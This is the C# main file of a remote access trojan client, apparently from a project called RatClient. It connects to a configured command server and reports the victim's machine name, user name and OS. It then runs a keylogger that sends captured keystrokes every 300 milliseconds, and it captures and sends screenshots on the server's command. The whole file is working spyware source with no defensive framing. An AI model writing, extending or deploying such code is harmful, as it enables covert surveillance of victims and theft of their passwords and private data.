using System;
using System.Net.Sockets;
using System.Text;
using System.Web.Script.Serialization;
using System.Timers;
using RatClient.Config;
using RatClient.Features;

class Program
{
    #region Variables
    private Config config = new Config();
    private static Timer keySendTimer;
    static TcpClient client;
    static NetworkStream stream;
    static readonly string Server = Config.IP;
    static readonly int Port = Config.Port;
    static readonly int bufferSize = Config.BufferSize;
    #endregion
    #region Features
    static ScreenViewer screenViewer = new ScreenViewer(bufferSize, SendJson);
    static KeyLogger keyLogger = new KeyLogger();
    #endregion

    static void Main(string[] args)
    {
        try
        {
            client = new TcpClient(Server, Port);
            stream = client.GetStream();

            SendInfo();

            // Keylogger
            keySendTimer = new Timer(300);
            keySendTimer.Elapsed += SendKeystrokes;
            keySendTimer.Start();

            while (true)
            {
                byte[] data = new byte[bufferSize];
                int bytes = stream.Read(data, 0, data.Length);
                if (bytes == 0) break;
                string responseData = Encoding.UTF8.GetString(data, 0, bytes);
                dynamic responseJson = new JavaScriptSerializer().Deserialize<dynamic>(responseData);

                HandleResponse(responseJson);
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("Exception: {0}", e);
        }
        finally
        {
            if (stream != null) stream.Close();
            if (client != null) client.Close();
        }
    }

    static void HandleResponse(dynamic responseJson)
    {
        switch (responseJson["type"].ToString())
        {
            case "message":
                Console.WriteLine("Received: {0}", responseJson["text"]);
                break;
            case "heartbeat":
                SendHeartbeatResponse();
                break;
            case "set_interval":
                screenViewer.SetIntervalAndStartSendingScreenshots((int)responseJson["interval"]);
                break;
            case "stop_screenshots":
                screenViewer.StopSendingScreenshots();
                break;
            case "start_keylogger":
                KeyLogger.Start();
                break;
            case "stop_keylogger":
                KeyLogger.Stop();
                break;
        }
    }

    static void SendKeystrokes(object sender, ElapsedEventArgs e)
    {
        string keystrokes = KeyLogger.GetKeystrokes();
        if (!string.IsNullOrEmpty(keystrokes))
        {
            SendJson(new { type = "keystroke", key = keystrokes });
        }
    }

    static void SendJson(object jsonObject)
    {
        string jsonString = new JavaScriptSerializer().Serialize(jsonObject);
        byte[] data = Encoding.UTF8.GetBytes(jsonString);
        stream.Write(data, 0, data.Length);
    }

    static void SendInfo()
    {
        var osInfo = GetOS();
        string pc = GetPC();
        string user = GetUser();

        var jsonOSInfo = new
        {
            type = "info",
            os = osInfo.Item1 + " " + osInfo.Item2,
            pc = pc,
            user = user
        };
        SendJson(jsonOSInfo);
    }

    static void SendHeartbeatResponse()
    {
        var heartbeatResponse = new
        {
            type = "heartbeat",
            text = "pong"
        };
        SendJson(heartbeatResponse);
    }

    static string GetPC()
    {
        return Environment.MachineName;
    }

    static Tuple<string, string> GetOS()
    {
        return new Tuple<string, string>(Environment.OSVersion.ToString(), Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
    }

    static string GetUser()
    {
        return Environment.UserName;
    }
}